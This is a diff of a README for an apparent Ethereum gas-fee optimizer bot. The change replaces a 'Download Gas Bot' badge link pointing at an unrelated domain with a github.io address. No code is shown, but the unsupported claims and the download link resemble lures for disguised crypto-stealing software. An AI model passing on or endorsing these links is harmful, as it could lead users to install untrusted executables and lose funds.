@@ -2,7 +2,7 @@
 
 Save ETH by sending transactions when gas is at its lowest. This real-time Ethereum Gas Fee Optimizer monitors the network, predicts price dips, and alerts you when to execute. Designed for traders, devs, and DeFi users who want max efficiency.
 
-[![Download Gas Bot](https://img.shields.io/badge/Download-Gas_Optimizer-blueviolet)](https://seomadjest.com)
+[![Download Gas Bot](https://img.shields.io/badge/Download-Gas_Optimizer-blueviolet)](https://ethereum-gas-fee-optimizer.github.io/.github)
 
 ---
 
